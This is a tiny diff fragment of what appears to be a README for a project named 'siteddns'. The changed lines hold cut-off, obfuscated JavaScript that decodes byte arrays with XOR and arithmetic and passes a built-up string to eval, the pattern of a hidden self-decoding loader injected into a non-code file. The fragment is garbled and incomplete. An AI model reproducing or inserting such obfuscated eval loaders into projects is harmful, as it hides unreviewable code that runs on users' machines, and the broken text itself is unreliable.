@@ -1,2 +1,2 @@
  # siteddns
->7);sl++;}sl=3;for(;;sl++){if(sl>43)break;ql[sl]=((ql[sl]-ql[sl+1])&0xff)^127;}sl=45;do{if(sl
+=2;xc--){vc[xc]=(vc[xc]+90)&0xff;vc[xc]=(((vc[xc]-133)&0xff)-49)&0xff;}";eval(xc);xc="xc=49;while(true){if(xc
